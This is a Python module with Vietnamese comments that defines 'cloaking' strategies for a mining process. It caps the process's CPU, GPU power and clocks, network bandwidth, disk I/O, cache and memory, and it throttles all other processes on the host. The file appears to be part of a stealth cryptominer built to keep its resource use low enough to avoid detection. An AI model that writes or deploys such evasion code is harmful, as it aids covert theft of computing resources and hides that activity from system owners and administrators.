# cloak_strategies.py

import os
import logging
import subprocess
import psutil
import pynvml
import traceback
from abc import ABC, abstractmethod
from typing import Dict, Any, List, Tuple, Optional, Type

from .utils import MiningProcess


from typing import TYPE_CHECKING
if TYPE_CHECKING:
    from .resource_control import (
        CPUResourceManager,
        GPUResourceManager,
        NetworkResourceManager,
        DiskIOResourceManager,
        CacheResourceManager,
        MemoryResourceManager
    )

###############################################################################
#                 LỚP CƠ SỞ: CloakStrategy (ABSTRACT)                         #
###############################################################################
class CloakStrategy(ABC):
    """
    Lớp cơ sở (abstract) cho tất cả CloakStrategy (CPU/GPU/Network/DiskIO/Cache/Memory).

    Các phương thức chính:
    - apply(process): Áp dụng cloaking cho tiến trình.
    - restore(process): Khôi phục cài đặt ban đầu cho tiến trình.
    """

    @abstractmethod
    def apply(self, process: MiningProcess) -> None:
        """
        Áp dụng cloaking cho tiến trình.

        :param process: Đối tượng MiningProcess để áp dụng cloaking.
        """
        pass

    @abstractmethod
    def restore(self, process: MiningProcess) -> None:
        """
        Khôi phục cài đặt ban đầu cho tiến trình.

        :param process: Đối tượng MiningProcess cần khôi phục.
        """
        pass


###############################################################################
#                 CPU STRATEGY: CpuCloakStrategy                              #
###############################################################################
class CpuCloakStrategy(CloakStrategy):
    """
    Chiến lược cloaking CPU:
      - Giới hạn CPU bằng cgroup,
      - Tối ưu cache CPU (nếu có),
      - Đặt affinity,
      - Hạn chế tiến trình bên ngoài (throttle_external).
    """

    def __init__(
        self,
        config: Dict[str, Any],
        logger: logging.Logger,
        cpu_resource_manager: "CPUResourceManager"
    ):
        """
        Khởi tạo CpuCloakStrategy.

        :param config: Cấu hình cloaking cho CPU (dict).
        :param logger: Logger để ghi log.
        :param cpu_resource_manager: Đối tượng quản lý tài nguyên CPU.
        """
        self.logger = logger
        self.config = config
        self.cpu_resource_manager = cpu_resource_manager

        self.throttle_percentage = config.get('throttle_percentage', 20)
        if not isinstance(self.throttle_percentage, (int, float)) or not (0 <= self.throttle_percentage <= 100):
            self.logger.warning("Giá trị throttle_percentage không hợp lệ, mặc định 20%.")
            self.throttle_percentage = 20

        self.throttle_external_percentage = config.get('throttle_external_percentage', 30)
        if not isinstance(self.throttle_external_percentage, (int, float)) or not (0 <= self.throttle_external_percentage <= 100):
            self.logger.warning("Giá trị throttle_external_percentage không hợp lệ, mặc định 30%.")
            self.throttle_external_percentage = 30

        self.exempt_pids = config.get('exempt_pids', [])  # Danh sách PID không bị throttle external
        self.target_cores = config.get('target_cores', None)

    def apply(self, process: MiningProcess) -> None:
        """
        Áp dụng CPU cloaking cho tiến trình.

        :param process: Đối tượng MiningProcess để giới hạn CPU.
        """
        try:
            pid, name = process.pid, process.name

            # 1) Giới hạn CPU usage
            cgroup_name = self.cpu_resource_manager.throttle_cpu_usage(pid, self.throttle_percentage)
            if cgroup_name:
                self.logger.info(f"[CPU Cloaking] Giới hạn CPU={self.throttle_percentage}% cho {name}(PID={pid}).")
            else:
                self.logger.error(f"[CPU Cloaking] Không thể giới hạn CPU cho {name}(PID={pid}).")
                return

            # 2) Tối ưu cache CPU
            success_cache = self.cpu_resource_manager.optimize_cache_usage(pid)
            if success_cache:
                self.logger.info(f"[CPU Cloaking] Tối ưu cache cho {name}(PID={pid}).")

            # 3) Đặt CPU affinity
            success_affinity = self.cpu_resource_manager.optimize_thread_scheduling(pid, self.target_cores)
            if success_affinity:
                self.logger.info(f"[CPU Cloaking] Đặt CPU affinity cho {name}(PID={pid}).")

            # 4) Hạn chế tiến trình bên ngoài
            outside_ok = self.cpu_resource_manager.limit_cpu_for_external_processes(
                [pid] + self.exempt_pids,
                self.throttle_external_percentage
            )
            if outside_ok:
                self.logger.info(f"[CPU Cloaking] Hạn chế CPU outside => throttle={self.throttle_external_percentage}%.")

        except psutil.NoSuchProcess as e:
            self.logger.error(f"CPU Cloaking: Tiến trình không tồn tại: {e}")
        except psutil.AccessDenied as e:
            self.logger.error(f"CPU Cloaking: Không đủ quyền cho PID={process.pid}: {e}")
        except Exception as e:
            self.logger.error(
                f"Lỗi cloaking CPU cho {process.name}(PID={process.pid}): {e}\n{traceback.format_exc()}"
            )
            raise

    def restore(self, process: MiningProcess) -> None:
        """
        Khôi phục CPU về trạng thái ban đầu.

        :param process: Đối tượng MiningProcess để khôi phục CPU.
        """
        try:
            pid, name = process.pid, process.name

            # 1) Xoá cgroup CPU (khôi phục usage)
            success_restore = self.cpu_resource_manager.restore_resources(pid)
            if success_restore:
                self.logger.info(f"[CPU Restore] Xoá cgroup CPU cho {name}(PID={pid}).")

            # 2) Bỏ hạn chế CPU outside => set=0 => remove cgroup
            unlimit_ok = self.cpu_resource_manager.limit_cpu_for_external_processes(
                [pid] + self.exempt_pids, 0
            )
            if unlimit_ok:
                self.logger.info(f"[CPU Restore] Huỷ giới hạn CPU outside (PID={pid}).")

        except psutil.NoSuchProcess as e:
            self.logger.error(f"CPU Restore: Tiến trình không tồn tại: {e}")
        except psutil.AccessDenied as e:
            self.logger.error(f"CPU Restore: Không đủ quyền cho PID={process.pid}: {e}")
        except Exception as e:
            self.logger.error(
                f"Lỗi khôi phục CPU cho {process.name}(PID={process.pid}): {e}\n{traceback.format_exc()}"
            )
            raise


###############################################################################
#                 GPU STRATEGY: GpuCloakStrategy                              #
###############################################################################
class GpuCloakStrategy(CloakStrategy):
    """
    Chiến lược cloaking GPU:
      - Giới hạn power limit,
      - Set xung nhịp (clock),
      - (Tùy chọn) limit_temperature => hạ xung nhịp nếu GPU nóng,
      - Khôi phục cài đặt gốc khi restore().
    """

    def __init__(
        self,
        config: Dict[str, Any],
        logger: logging.Logger,
        gpu_resource_manager: "GPUResourceManager"
    ):
        """
        Khởi tạo GpuCloakStrategy.

        :param config: Cấu hình cloaking cho GPU (dict).
        :param logger: Logger để ghi log.
        :param gpu_resource_manager: Đối tượng quản lý tài nguyên GPU.
        """
        self.logger = logger
        self.config = config
        self.gpu_resource_manager = gpu_resource_manager

        # Tham số chung
        self.throttle_percentage = config.get('throttle_percentage', 20)
        if not isinstance(self.throttle_percentage, (int, float)) or not (0 <= self.throttle_percentage <= 100):
            self.logger.warning("throttle_percentage GPU không hợp lệ, mặc định 20%.")
            self.throttle_percentage = 20

        # Clock
        self.target_sm_clock = config.get('sm_clock', 1300)
        self.target_mem_clock = config.get('mem_clock', 800)

        # Nhiệt độ (nếu muốn limit_temperature)
        self.temperature_threshold = config.get('temperature_threshold', 80)
        if self.temperature_threshold <= 0:
            self.logger.warning("temperature_threshold không hợp lệ, mặc định=80.")
            self.temperature_threshold = 80

        self.fan_speed_increase = config.get('fan_speed_increase', 20)

    def apply(self, process: MiningProcess) -> None:
        """
        Áp dụng GPU cloaking cho tiến trình.

        :param process: Đối tượng MiningProcess để giới hạn GPU.
        """
        try:
            pid, name = process.pid, process.name

            gpu_count = self.gpu_resource_manager.get_gpu_count()
            if gpu_count == 0:
                self.logger.warning("[GPU Cloaking] Hệ thống không có GPU. Bỏ qua cloaking.")
                return

            # Giới hạn power + set clocks cho mỗi GPU
            for gpu_index in range(gpu_count):
                current_pl = self.gpu_resource_manager.get_gpu_power_limit(gpu_index)
                if current_pl is None:
                    continue

                desired_pl = int(round(current_pl * (1 - self.throttle_percentage / 100)))
                ok_pl = self.gpu_resource_manager.set_gpu_power_limit(pid, gpu_index, desired_pl)
                if ok_pl:
                    self.logger.info(f"[GPU Cloaking] GPU={gpu_index} => power={desired_pl}W (PID={pid}).")

                ok_clocks = self.gpu_resource_manager.set_gpu_clocks(
                    pid,
                    gpu_index,
                    self.target_sm_clock,
                    self.target_mem_clock
                )
                if ok_clocks:
                    self.logger.info(f"[GPU Cloaking] GPU={gpu_index} => SM={self.target_sm_clock}, MEM={self.target_mem_clock} (PID={pid}).")

            # Gọi limit_temperature để kiểm soát nhiệt
            for gpu_index in range(gpu_count):
                success_temp = self.gpu_resource_manager.limit_temperature(
                    gpu_index=gpu_index,
                    temperature_threshold=self.temperature_threshold,
                    fan_speed_increase=self.fan_speed_increase
                )
                if success_temp:
                    self.logger.info(f"[GPU Cloaking] Giới hạn nhiệt độ cho GPU={gpu_index} (PID={pid}).")
                else:
                    self.logger.error(f"[GPU Cloaking] Không thể giới hạn nhiệt độ cho GPU={gpu_index}.")

        except psutil.NoSuchProcess as e:
            self.logger.error(f"GPU Cloaking: Tiến trình không tồn tại: {e}")
        except psutil.AccessDenied as e:
            self.logger.error(f"GPU Cloaking: Không đủ quyền cho PID={process.pid}: {e}")
        except Exception as e:
            self.logger.error(
                f"Lỗi cloaking GPU cho {process.name}(PID={process.pid}): {e}\n{traceback.format_exc()}"
            )
            raise

    def restore(self, process: MiningProcess) -> None:
        """
        Khôi phục cài đặt GPU về trạng thái gốc.

        :param process: Đối tượng MiningProcess để khôi phục GPU.
        """
        try:
            pid, name = process.pid, process.name
            success = self.gpu_resource_manager.restore_resources(pid)
            if success:
                self.logger.info(f"[GPU Restore] Đã khôi phục GPU cho {name}(PID={pid}).")
            else:
                self.logger.error(f"[GPU Restore] Không thể khôi phục GPU cho {name}(PID={pid}).")

        except psutil.NoSuchProcess as e:
            self.logger.error(f"GPU Restore: Tiến trình không tồn tại: {e}")
        except psutil.AccessDenied as e:
            self.logger.error(f"GPU Restore: Không đủ quyền cho PID={process.pid}: {e}")
        except Exception as e:
            self.logger.error(
                f"Lỗi khôi phục GPU cho {process.name}(PID={process.pid}): {e}\n{traceback.format_exc()}"
            )
            raise


###############################################################################
#              NETWORK STRATEGY: NetworkCloakStrategy                         #
###############################################################################
class NetworkCloakStrategy(CloakStrategy):
    """
    Cloaking mạng:
      - Đánh dấu pid bằng iptables,
      - Giới hạn băng thông (tc),
      - Khôi phục khi restore().
    """

    def __init__(
        self,
        config: Dict[str, Any],
        logger: logging.Logger,
        network_resource_manager: "NetworkResourceManager"
    ):
        """
        Khởi tạo NetworkCloakStrategy.

        :param config: Cấu hình cloaking cho mạng (dict).
        :param logger: Logger để ghi log.
        :param network_resource_manager: Đối tượng quản lý tài nguyên mạng.
        """
        self.logger = logger
        self.config = config
        self.network_resource_manager = network_resource_manager

        self.bandwidth_reduction_mbps = config.get('bandwidth_reduction_mbps', 10)
        if self.bandwidth_reduction_mbps <= 0:
            self.logger.warning("bandwidth_reduction_mbps không hợp lệ, mặc định=10.")
            self.bandwidth_reduction_mbps = 10

        self.network_interface = config.get('network_interface') or "eth0"
        self.process_marks: Dict[int, int] = {}

    def apply(self, process: MiningProcess) -> None:
        """
        Áp dụng cloaking cho mạng (giới hạn băng thông, mark iptables).

        :param process: Đối tượng MiningProcess để áp dụng cloaking mạng.
        """
        try:
            pid, name = process.pid, process.name
            mark = pid % 32768  # Ta dùng pid làm mark (ví dụ)

            ok_mark = self.network_resource_manager.mark_packets(pid, mark)
            if not ok_mark:
                self.logger.error(f"[Net Cloaking] Không thể MARK iptables cho PID={pid}.")
                return

            ok_limit = self.network_resource_manager.limit_bandwidth(
                self.network_interface,
                mark,
                self.bandwidth_reduction_mbps
            )
            if not ok_limit:
                self.logger.error(f"[Net Cloaking] Giới hạn băng thông thất bại (iface={self.network_interface}).")
                return

            self.process_marks[pid] = mark
            self.logger.info(f"[Net Cloaking] Limit={self.bandwidth_reduction_mbps}Mbps cho PID={pid}, iface={self.network_interface}.")

        except psutil.NoSuchProcess as e:
            self.logger.error(f"Net Cloaking: Tiến trình không tồn tại: {e}")
        except psutil.AccessDenied as e:
            self.logger.error(f"Net Cloaking: Không đủ quyền cho PID={process.pid}: {e}")
        except Exception as e:
            self.logger.error(
                f"Lỗi cloaking mạng cho {process.name}(PID={process.pid}): {e}\n{traceback.format_exc()}"
            )
            raise

    def restore(self, process: MiningProcess) -> None:
        """
        Khôi phục băng thông mạng về bình thường.

        :param process: Đối tượng MiningProcess để khôi phục mạng.
        """
        try:
            pid, name = process.pid, process.name
            mark = self.process_marks.get(pid)
            if mark is None:
                self.logger.warning(f"[Net Restore] Không tìm thấy mark cho PID={pid}.")
                return

            ok_bw = self.network_resource_manager.remove_bandwidth_limit(self.network_interface, mark)
            if ok_bw:
                self.logger.info(f"[Net Restore] Đã gỡ hạn chế băng thông cho PID={pid}.")

            ok_unmark = self.network_resource_manager.unmark_packets(pid, mark)
            if ok_unmark:
                self.logger.info(f"[Net Restore] Đã xoá iptables MARK cho PID={pid}.")

            if pid in self.process_marks:
                del self.process_marks[pid]

        except psutil.NoSuchProcess as e:
            self.logger.error(f"Net Restore: Tiến trình không tồn tại: {e}")
        except psutil.AccessDenied as e:
            self.logger.error(f"Net Restore: Không đủ quyền cho PID={process.pid}: {e}")
        except Exception as e:
            self.logger.error(
                f"Lỗi khôi phục mạng cho {process.name}(PID={process.pid}): {e}\n{traceback.format_exc()}"
            )
            raise


###############################################################################
#            DISK IO STRATEGY: DiskIoCloakStrategy                            #
###############################################################################
class DiskIoCloakStrategy(CloakStrategy):
    """
    Chiến lược cloaking Disk I/O qua việc giới hạn I/O bằng ionice hoặc cgroup I/O.
    """

    def __init__(
        self,
        config: Dict[str, Any],
        logger: logging.Logger,
        disk_io_resource_manager: "DiskIOResourceManager"
    ):
        """
        Khởi tạo DiskIoCloakStrategy.

        :param config: Cấu hình cloaking cho Disk I/O (dict).
        :param logger: Logger để ghi log.
        :param disk_io_resource_manager: Đối tượng quản lý tài nguyên Disk I/O.
        """
        self.logger = logger
        self.config = config
        self.disk_io_resource_manager = disk_io_resource_manager

        self.io_weight = config.get('io_weight', 500)
        if not isinstance(self.io_weight, int) or not (1 <= self.io_weight <= 1000):
            self.logger.warning(f"io_weight không hợp lệ: {self.io_weight}. Mặc định=500.")
            self.io_weight = 500

    def apply(self, process: MiningProcess) -> None:
        """
        Áp dụng cloaking Disk I/O cho tiến trình.

        :param process: Đối tượng MiningProcess để giới hạn Disk I/O.
        """
        try:
            pid, name = process.pid, process.name
            ok = self.disk_io_resource_manager.set_io_weight(pid, self.io_weight)
            if ok:
                self.logger.info(f"[DiskIO Cloaking] PID={pid}, io_weight={self.io_weight}.")
            else:
                self.logger.error(f"[DiskIO Cloaking] Không thể set io_weight cho PID={pid}.")

        except psutil.NoSuchProcess as e:
            self.logger.error(f"DiskIO Cloaking: Tiến trình không tồn tại: {e}")
        except psutil.AccessDenied as e:
            self.logger.error(f"DiskIO Cloaking: Không đủ quyền cho PID={process.pid}: {e}")
        except Exception as e:
            self.logger.error(
                f"Lỗi DiskIO Cloaking cho {process.name}(PID={process.pid}): {e}\n{traceback.format_exc()}"
            )
            raise

    def restore(self, process: MiningProcess) -> None:
        """
        Khôi phục Disk I/O về trạng thái gốc.

        :param process: Đối tượng MiningProcess để khôi phục I/O.
        """
        try:
            pid, name = process.pid, process.name
            ok = self.disk_io_resource_manager.restore_resources(pid)
            if ok:
                self.logger.info(f"[DiskIO Restore] Khôi phục I/O cho PID={pid}.")
            else:
                self.logger.error(f"[DiskIO Restore] Không thể khôi phục I/O cho PID={pid}.")
        except psutil.NoSuchProcess as e:
            self.logger.error(f"DiskIO Restore: Tiến trình không tồn tại: {e}")
        except psutil.AccessDenied as e:
            self.logger.error(f"DiskIO Restore: Không đủ quyền cho PID={process.pid}: {e}")
        except Exception as e:
            self.logger.error(
                f"Lỗi khôi phục DiskIO cho {process.name}(PID={process.pid}): {e}\n{traceback.format_exc()}"
            )
            raise


###############################################################################
#            CACHE STRATEGY: CacheCloakStrategy                               #
###############################################################################
class CacheCloakStrategy(CloakStrategy):
    """
    Chiến lược cloaking Cache:
      - Drop caches,
      - Giới hạn cache usage,
      - Khôi phục khi restore => đặt 100%.
    """

    def __init__(
        self,
        config: Dict[str, Any],
        logger: logging.Logger,
        cache_resource_manager: "CacheResourceManager"
    ):
        """
        Khởi tạo CacheCloakStrategy.

        :param config: Cấu hình cloaking cho Cache (dict).
        :param logger: Logger để ghi log.
        :param cache_resource_manager: Đối tượng quản lý tài nguyên Cache.
        """
        self.logger = logger
        self.config = config
        self.cache_resource_manager = cache_resource_manager

        self.cache_limit_percent = config.get('cache_limit_percent', 50)
        if not (0 <= self.cache_limit_percent <= 100):
            self.logger.warning(f"cache_limit_percent={self.cache_limit_percent} không hợp lệ, mặc định=50%.")
            self.cache_limit_percent = 50

    def apply(self, process: MiningProcess) -> None:
        """
        Áp dụng cloaking Cache (drop cache, limit cache usage).

        :param process: Đối tượng MiningProcess để giới hạn Cache.
        """
        try:
            pid, name = process.pid, process.name
            ok_drop = self.cache_resource_manager.drop_caches(pid)
            if ok_drop:
                self.logger.info(f"[Cache Cloaking] Đã drop caches (PID={pid}).")

            ok_limit = self.cache_resource_manager.limit_cache_usage(self.cache_limit_percent, pid)
            if ok_limit:
                self.logger.info(f"[Cache Cloaking] Giới hạn cache={self.cache_limit_percent}% cho PID={pid}.")
            else:
                self.logger.error(f"[Cache Cloaking] Không thể limit cache cho PID={pid}.")

        except psutil.NoSuchProcess as e:
            self.logger.error(f"Cache Cloaking: Tiến trình không tồn tại: {e}")
        except psutil.AccessDenied as e:
            self.logger.error(f"Cache Cloaking: Không đủ quyền cho PID={process.pid}: {e}")
        except Exception as e:
            self.logger.error(
                f"Lỗi cloaking Cache cho {process.name}(PID={process.pid}): {e}\n{traceback.format_exc()}"
            )
            raise

    def restore(self, process: MiningProcess) -> None:
        """
        Khôi phục cache về 100%.

        :param process: Đối tượng MiningProcess cần khôi phục cache.
        """
        try:
            pid, name = process.pid, process.name
            ok = self.cache_resource_manager.limit_cache_usage(100, pid)
            if ok:
                self.logger.info(f"[Cache Restore] Đã khôi phục cache=100% cho PID={pid}.")
            else:
                self.logger.error(f"[Cache Restore] Không thể khôi phục cache cho PID={pid}.")
        except psutil.NoSuchProcess as e:
            self.logger.error(f"Cache Restore: Tiến trình không tồn tại: {e}")
        except psutil.AccessDenied as e:
            self.logger.error(f"Cache Restore: Không đủ quyền cho PID={process.pid}: {e}")
        except Exception as e:
            self.logger.error(
                f"Lỗi khôi phục Cache cho {process.name}(PID={process.pid}): {e}\n{traceback.format_exc()}"
            )
            raise


###############################################################################
#            MEMORY STRATEGY: MemoryCloakStrategy                              #
###############################################################################
class MemoryCloakStrategy(CloakStrategy):
    """
    Chiến lược cloaking Memory:
      - Drop caches (nếu cần),
      - Giới hạn memory usage,
      - Khôi phục => remove memory limit, cache=100%.
    """

    def __init__(
        self,
        config: Dict[str, Any],
        logger: logging.Logger,
        memory_resource_manager: "MemoryResourceManager",
        cache_resource_manager: "CacheResourceManager"
    ):
        """
        Khởi tạo MemoryCloakStrategy.

        :param config: Cấu hình cloaking cho Memory (dict).
        :param logger: Logger để ghi log.
        :param memory_resource_manager: Đối tượng quản lý tài nguyên Memory.
        :param cache_resource_manager: Đối tượng quản lý tài nguyên Cache (sử dụng khi drop cache).
        """
        self.logger = logger
        self.config = config
        self.memory_resource_manager = memory_resource_manager
        self.cache_resource_manager = cache_resource_manager

        self.memory_limit_percent = config.get('memory_limit_percent', 50)
        if not (0 <= self.memory_limit_percent <= 100):
            self.logger.warning(f"memory_limit_percent={self.memory_limit_percent} không hợp lệ, mặc định=50%.")
            self.memory_limit_percent = 50

    def apply(self, process: MiningProcess) -> None:
        """
        Áp dụng cloaking Memory (drop cache, giới hạn memory usage).

        :param process: Đối tượng MiningProcess để giới hạn Memory.
        """
        try:
            pid, name = process.pid, process.name

            # 1) Drop caches
            ok_drop = self.cache_resource_manager.drop_caches(pid)
            if ok_drop:
                self.logger.info(f"[Memory Cloaking] Đã drop caches (PID={pid}).")

            # 2) Giới hạn memory
            total_mem_bytes = psutil.virtual_memory().total
            limit_bytes = int(round(self.memory_limit_percent / 100 * total_mem_bytes))
            limit_mb = limit_bytes // (1024 * 1024)

            ok_limit = self.memory_resource_manager.set_memory_limit(pid, limit_mb)
            if ok_limit:
                self.logger.info(f"[Memory Cloaking] Giới hạn={limit_mb}MB (~{self.memory_limit_percent}%) cho PID={pid}.")
            else:
                self.logger.error(f"[Memory Cloaking] Không thể set memory_limit cho PID={pid}.")

        except psutil.NoSuchProcess as e:
            self.logger.error(f"Memory Cloaking: Tiến trình không tồn tại: {e}")
        except psutil.AccessDenied as e:
            self.logger.error(f"Memory Cloaking: Không đủ quyền cho PID={process.pid}: {e}")
        except Exception as e:
            self.logger.error(
                f"Lỗi cloaking Memory cho {process.name}(PID={process.pid}): {e}\n{traceback.format_exc()}"
            )
            raise

    def restore(self, process: MiningProcess) -> None:
        """
        Khôi phục memory limit + cache=100%.

        :param process: Đối tượng MiningProcess cần khôi phục Memory.
        """
        try:
            pid, name = process.pid, process.name

            # 1) Bỏ giới hạn memory
            ok_restore_mem = self.memory_resource_manager.restore_resources(pid)
            if ok_restore_mem:
                self.logger.info(f"[Memory Restore] Khôi phục memory cho PID={pid}.")
            else:
                self.logger.error(f"[Memory Restore] Không thể khôi phục memory cho PID={pid}.")

            # 2) Cache=100%
            ok_cache = self.cache_resource_manager.limit_cache_usage(100, pid)
            if ok_cache:
                self.logger.info(f"[Memory Restore] Khôi phục cache=100% cho PID={pid}.")
            else:
                self.logger.error(f"[Memory Restore] Không thể khôi phục cache cho PID={pid}.")

        except psutil.NoSuchProcess as e:
            self.logger.error(f"Memory Restore: Tiến trình không tồn tại: {e}")
        except psutil.AccessDenied as e:
            self.logger.error(f"Memory Restore: Không đủ quyền cho PID={process.pid}: {e}")
        except Exception as e:
            self.logger.error(
                f"Lỗi khôi phục Memory cho {process.name}(PID={process.pid}): {e}\n{traceback.format_exc()}"
            )
            raise


###############################################################################
#                     FACTORY: CloakStrategyFactory                           #
###############################################################################
class CloakStrategyFactory:
    """
    Factory tạo các instance chiến lược cloaking cho CPU, GPU, Network, DiskIO, Cache, Memory.
    """

    STRATEGY_MAP: Dict[str, Type[CloakStrategy]] = {
        "cpu": CpuCloakStrategy,
        "gpu": GpuCloakStrategy,
        "network": NetworkCloakStrategy,
        "disk_io": DiskIoCloakStrategy,
        "cache": CacheCloakStrategy
    }

    @staticmethod
    def create_strategy(
        strategy_name: str,
        config: Dict[str, Any],
        logger: logging.Logger,
        resource_managers: Dict[str, Any]
    ) -> Optional[CloakStrategy]:
        """
        Tạo và trả về instance CloakStrategy tương ứng với strategy_name.

        :param strategy_name: Tên chiến lược ('cpu', 'gpu', 'network', 'disk_io', 'cache', 'memory').
        :param config: Config cloaking (dict).
        :param logger: Đối tượng Logger.
        :param resource_managers: Dictionary { 'cpu': CPUResourceManager, 'gpu': GPUResourceManager, ... }.
        :return: Strategy instance nếu tạo thành công, None nếu thất bại.
        """
        name_lower = strategy_name.lower().strip()

        # Trường hợp đặc biệt: 'memory'
        if name_lower == "memory":
            memory_rm = resource_managers.get('memory')
            cache_rm = resource_managers.get('cache')
            if not memory_rm or not cache_rm:
                logger.error("Memory hoặc Cache ResourceManager không tồn tại, không thể tạo MemoryCloakStrategy.")
                return None
            return MemoryCloakStrategy(config, logger, memory_rm, cache_rm)

        # Trường hợp chung
        strategy_class = CloakStrategyFactory.STRATEGY_MAP.get(name_lower)
        if not strategy_class:
            logger.error(f"Không tìm thấy CloakStrategy tương ứng với '{strategy_name}'.")
            return None

        # Lấy resource manager phù hợp
        rm = resource_managers.get(name_lower)
        if not rm:
            logger.error(f"ResourceManager cho '{name_lower}' không tồn tại trong resource_managers.")
            return None

        try:
            # Tạo instance Strategy
            strategy_instance = strategy_class(config, logger, rm)
            return strategy_instance
        except Exception as e:
            logger.error(f"Lỗi khi tạo strategy '{strategy_name}': {e}\n{traceback.format_exc()}")
            return None
